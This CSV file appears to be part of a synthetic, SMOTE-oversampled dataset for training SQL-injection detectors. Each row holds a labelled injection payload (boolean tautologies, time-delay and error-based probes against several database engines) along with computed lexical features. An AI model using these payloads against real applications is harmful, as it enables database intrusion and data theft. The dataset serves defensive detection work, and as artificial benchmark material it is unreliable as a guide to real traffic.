id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000245,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,0.13540369130729543,370.4352859831218,31.0,3.4182007049574437,96.14509532770725,57.77199305646002,165.4145580791636,51.1036395197909,0.2595417005382733,0.15599910723625593,0.44650974149495704,0.13794945073051373,0.08291161583272055,0.0,2.9378162881254597,0.0,0.0,3.0,0.0,34.08291161583272,0.0,0.0,1.0,15.937816288125461,0.02072790395818014,0.0,0.97927209604182,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.9792720960418196,0.0,0.04145580791636039,0.9792720960418198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000246,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.29423290961684617,158.09619877655814,36.95190061172094,4.1953897880972235,76.09619877655813,16.096198776558126,48.61520489376748,17.288596329674384,0.48132469539864586,0.10180617983667936,0.3075351516283194,0.1093339731363554,0.1442981648371926,0.9519006117209359,2.0,0.0,1.0,2.0,0.0,5.951900611720935,0.0,0.2404969413953203,2.0961987765581287,5.048099388279064,0.04809938827906418,0.9519006117209358,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0480993882790641,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.048099388279065
SMOTE_000247,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.14625467962077832,170.83200753215795,36.0,3.9440625947782095,52.00910613214823,24.162759053572294,64.204416996435,30.455725350002428,0.30415726998274617,0.14190885481392052,0.3755584869485324,0.17837538825480087,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.325518107144593,0.0,2.0,1.0976554321433776,10.065103621428918,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9674481892855408,0.0,0.9674481892855405,0.0,0.03255181071445934,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22786267500121493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.195310864286756
SMOTE_000248,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000028,3.316252532422136,178.7950135438822,29.51119026120822,3.7042467488524338,92.59715059650411,9.955238955167122,54.77619477583561,21.466429216375342,0.5161954743336571,0.05543151200889192,0.306010670467176,0.12236234319027497,1.9552389551671232,2.044761044832877,0.0,0.0,1.0,2.0,0.0,6.977619477583561,2.0,0.0,3.955238955167123,3.0,0.48880973879178086,0.5111902612082192,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.511190261208219,0.48880973879178086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000249,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.2684453104693072,196.43999539947316,33.468571757180484,3.7246615556762235,55.53142824281951,25.594284728458536,80.2514259425561,35.062856485639024,0.2829577551260683,0.13018374968309504,0.40832173098712804,0.1785367642037086,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.062856485639024,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5314282428195118,0.46857175718048816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000250,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.5028213375799149,159.50865600231842,36.24567199884079,4.239314516222903,77.50865600231842,17.508656002318418,42.96537599072632,21.52596800695526,0.48590624177967207,0.10974007722821263,0.26948596765906474,0.13486771333305053,2.262984003477629,0.2456719988407902,2.0,0.0,1.0,2.0,0.0,5.24567199884079,0.0,3.7716400057960486,3.5086560023184195,5.75432800115921,0.7543280011592097,0.24567199884079038,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7543280011592097,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.75432800115921
SMOTE_000251,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.7071217591911718,47.119044485049244,16.749205931339898,3.4220238289326703,6.498411862679795,18.62063262236944,16.000000000000007,6.0,0.13600772501558545,0.39017413493104314,0.3445950109479065,0.12922312910546493,0.12539703433005123,0.0,2.8746029656699488,0.0,0.0,1.8746029656699488,0.0,1.1253970343300495,0.0,0.0,-2.220446049250313e-16,4.7492059313398975,0.12539703433005106,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8746029656699489,0.0,0.12539703433005112,0.8746029656699489,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8746029656699488
SMOTE_000252,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000018,3.4737301459785823,373.3733484970329,36.03618614370487,3.5371723660992065,111.05789782992778,40.956576627554156,166.86972988266245,54.48914415688854,0.29910473832802215,0.10918039370393637,0.4456449532470037,0.14606991472103778,4.0,0.0,0.0,0.0,0.0,1.9927627712590261,0.0,34.97828831377707,0.0,1.0072372287409739,2.510855843111461,11.992762771259027,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5036186143704869,1.4963813856295132,0.0,0.0,0.503618614370487,1.4963813856295132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.49638138562951306,0.0,0.0,0.0,0.0,9.481906928147565,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,15.47466969940659
SMOTE_000253,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000015,0.6428823518417274,70.07399211748306,22.57199824832957,3.3246467543483544,8.798995766796459,15.869000145972535,30.619997080549282,14.785999124164784,0.10703659920238254,0.2374933028512469,0.439965816956326,0.21550428099004457,4.261999708054929,0.0,0.8690001459725358,0.13099985402746406,0.8690001459725358,2.0,0.0,4.523999416109858,2.0,0.0,0.13099985402746395,3.869000145972536,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000254,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,1.8712325876289877,33.41450772845232,16.06908462140872,3.2091229059781194,7.46545768929564,4.494530783287015,14.029073093991371,7.425446161878295,0.25764332497552245,0.10612775760837434,0.41400669519388095,0.2222222222222222,0.7127230809391469,0.8218192297652132,0.17818077023478673,1.6436384595304265,1.0,0.35636154046957347,0.0,2.356361540469573,0.35636154046957347,0.0,-2.220446049250313e-16,3.178180770234787,0.17818077023478668,0.8218192297652134,0.0,0.0,0.8218192297652132,0.17818077023478673,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17818077023478684,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1781807702347873
SMOTE_000255,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,0.26888773710433633,210.04320632519176,29.217453107910963,3.4737466112546933,108.56452519139721,12.521887458986313,65.47839683740412,23.47839683740412,0.5158433991145346,0.05992125624874774,0.3121475794667571,0.11208776516996061,4.0,0.0,0.0,0.0,0.9565093784178073,2.0,0.0,8.347924972657543,2.0,0.043490621582192746,5.869528135253422,3.217453107910963,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.043490621582192746,0.9565093784178073,0.0,0.0,0.9565093784178074,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.21745310791096362,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.130471864746578
SMOTE_000256,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,2.675748488270083,175.92079829231065,34.0,3.830726697260986,58.07745922533867,18.614446355657318,68.69103433982065,30.537858371493993,0.3354154595498182,0.10295378741094993,0.38889314968460464,0.17273760335462715,3.6153175968326656,0.0,0.0,0.0,0.0,1.2306351936653315,0.0,14.461270387330663,1.2306351936653313,1.3846824031673344,2.2306351936653313,7.230635193665331,1.0,0.0,0.0,0.0,0.0,0.6153175968326657,1.0,0.0,0.0,0.0,1.0,0.38468240316733426,0.0,0.0,0.38468240316733426,1.0,0.6153175968326657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0765879841633286,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.4612703873306625
SMOTE_000257,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.9972534664410938,251.43805104869674,36.59365815855054,3.780720671634991,77.25073473159566,29.0,100.0,45.18731631710108,0.3070953172779551,0.11535233513800763,0.3977666728896815,0.17978567469435577,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,1.1873163171010856,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000258,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,1.4935476824943326,382.49645354765283,31.0,3.344380298893103,94.75035464523472,58.0,177.49645354765283,52.24964535476528,0.24794159167125554,0.15173392719498363,0.4636990504315234,0.13662543070223743,0.0,0.0,1.7503546452347176,0.0,0.0,3.0,0.0,36.49929070953056,0.0,0.0,1.0,14.750354645234717,0.0,0.0,0.3751773226173587,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.37517732261735887,0.0,0.6248226773826412,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000259,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.47784861927073585,62.18002998554803,22.825290802936554,3.7563372174243894,18.539099416151053,16.917470919706346,19.898168846754075,6.82529080293655,0.2736402110231287,0.2928809719372001,0.32409202904374,0.10938678799593116,0.0,1.0,2.0,0.0,0.08252908029365547,2.0,0.0,1.3301163211746214,0.0,0.0,0.16505816058731093,4.082529080293655,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.08252908029365535,0.0,1.0,0.0825290802936555,0.9174709197063445,0.08252908029365552,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1650581605873107
SMOTE_000260,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,0.3912566722587956,70.96715942081634,25.5482576490703,3.767418605413563,14.0,23.209450885873025,23.322386473605448,10.435322061337875,0.19886918259242117,0.3265449784730108,0.32859835279541855,0.14598748613914944,0.0,1.0,2.8870644122675753,0.0,0.0,2.0,0.0,2.7741288245351505,0.0,0.8870644122675752,0.8870644122675753,4.887064412267575,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.11293558773242485,0.887064412267575,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,1.746844904305495,390.4236403333522,31.0,3.290317205167057,97.8127630001698,53.339956333125805,185.0,54.2709210000566,0.2505158067986826,0.13663854567896017,0.47384501631798703,0.13900063120437017,1.6945613334087979,0.0,0.5763596666478006,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.5763596666478,0.42364033335219947,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.4236403333521994,0.5763596666478006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000262,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,0.018408760611281005,203.39355169377689,32.99581327985344,3.684359381613479,56.09838792344422,27.041867201465628,84.21142936740142,36.04186720146563,0.2758360381188524,0.13297813042426954,0.4139173499717187,0.17726848148515936,4.0,0.0,0.0,0.0,0.0,2.0020933600732813,0.0,18.041867201465625,1.9958132798534371,0.9979066399267186,2.9958132798534374,8.010466800366407,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9979066399267187,0.004186720146562628,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0020933600732813973,0.0,0.0,0.0,0.0,5.014653520512969,0.0,0.0,0.0,0.0,0.0,0.0,0.0020933600732812863,0.0020933600732812863,7.025120320879374
SMOTE_000263,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,2.738386759443464,141.4768174372398,36.18546050208166,4.079371130090106,56.966801056515216,19.662277939321456,47.278190753122495,17.569547688280625,0.4023766530244539,0.1390677449000005,0.33432991569356524,0.12422568638198042,1.5695476882806239,0.476817437239792,2.0,0.5231825627602079,0.47681743723979214,2.0,0.0,7.092730251040831,0.0,0.0,1.476817437239792,5.523182562760208,0.5231825627602079,0.4768174372397922,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.4768174372397921,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.476817437239792
SMOTE_000264,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.8557867118046125,158.2797975072792,36.8601012463604,4.201099358754702,76.2797975072792,16.279797507279202,47.88080997088319,17.839392521837606,0.48192022925620626,0.1028374701753816,0.3025893155673601,0.11265298500105204,0.41969626091880374,0.8601012463603986,2.0,0.0,1.0,2.0,0.0,5.860101246360398,0.0,0.6994937681980061,2.2797975072792025,5.139898753639601,0.1398987536396012,0.8601012463603988,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1398987536396012,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.139898753639601
SMOTE_000265,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,3.587746552620247,287.1362015472543,34.046463178409766,3.626170982009767,81.37697674363312,39.11192829385944,121.74022286658129,44.90707364318047,0.2888473786856992,0.13154901569631836,0.4189929453146006,0.16061066030338186,0.0,0.0,2.3907073643180463,0.0,0.0,1.7814147286360928,0.0,26.688488371816558,0.0,1.218585271363907,2.827877907045861,14.17212209295414,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6092926356819535,0.781414728636093,0.0,0.39070736431804653,0.0,0.6092926356819536,0.39070736431804653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3907073643180464,0.0,0.0,0.0,0.0,8.95353682159023,0.0,0.0,0.0,0.0,0.0,0.0,0.3907073643180464,0.3907073643180464,12.29778100749851
SMOTE_000266,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.059520074275770274,49.873825242285434,17.218456310571362,3.491876867330307,7.370425917925353,20.028494301378874,16.351429717006106,6.123475305975116,0.144598942434845,0.4058358251442837,0.3269993996608383,0.12256583276003301,0.02849430137887321,0.0,2.9905018995403756,0.009498100459624403,0.0,2.0,0.0,1.0759848036769952,0.0,0.0,0.009498100459624181,5.009498100459624,0.009498100459624403,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.009498100459624403,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0094981004596244
SMOTE_000267,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.027052550210954047,254.9338628536962,36.01102285771729,3.7961265467262897,81.91181713826163,29.0,100.0,44.022045715434594,0.32129989158600875,0.11375569694059073,0.39226102393307155,0.17268338754032897,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.02204571543459316,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000268,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,2.7060978435213956,72.33711713048383,22.061183687211013,3.115820827165752,16.83022773311155,11.86142642754032,32.39951451934139,11.245948450490586,0.18003284748009263,0.18892348087851135,0.4747462222787789,0.15629744936261705,1.9538088091801067,0.0,0.9538088091801067,0.47690440459005334,0.0,1.0,0.0,5.861426427540319,0.5230955954099467,0.0,0.47690440459005323,2.4307132137701606,1.0,0.0,0.47690440459005334,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000269,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,0.2799002665401581,85.87096992517807,18.772434176376585,2.799995866833153,4.886217088188296,23.146628161412202,46.179473411012694,11.658651264564881,0.058003460417338976,0.26938090818288574,0.5354152601360154,0.13720037126375992,0.056891455905853094,0.0,1.056891455905853,0.0,0.9431085440941469,1.9431085440941467,0.0,7.658651264564881,0.0,0.0,-2.220446049250313e-16,3.9431085440941467,0.05689145590585315,0.0,0.056891455905853205,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9431085440941468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9431085440941471
SMOTE_000270,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,2.312306526416203,165.4622286481818,33.0,3.7049842936813944,46.397314305348836,21.762171439281182,68.28651431784354,29.01622858570824,0.28229421917761915,0.13090988289643263,0.4122493873973714,0.17454651052857684,4.87297142678647,0.0,0.0,0.43648571339323483,0.0,2.0,0.0,13.635142866067651,2.0,0.5635142866067652,2.12702857321353,5.817571433033826,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5635142866067653,0.0,0.0,0.0,0.0,1.563514286606765,0.43648571339323483,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8175714330338257,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.817571433033826
SMOTE_000271,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000028,1.516710995573781,143.4691318768704,29.76153325667739,3.9369874319943254,72.6153325667739,8.0,44.046133026709555,18.80766628338695,0.5060697846803508,0.05595259506521248,0.30733902961941373,0.13063859063502306,0.0,3.046133026709559,0.4769334866452205,0.0,1.0,1.7615332566773898,0.0,6.0,1.5230665133547796,0.0,2.0,3.23846674332261,0.0,0.7615332566773899,0.2384667433226102,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7615332566773898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.76153325667739
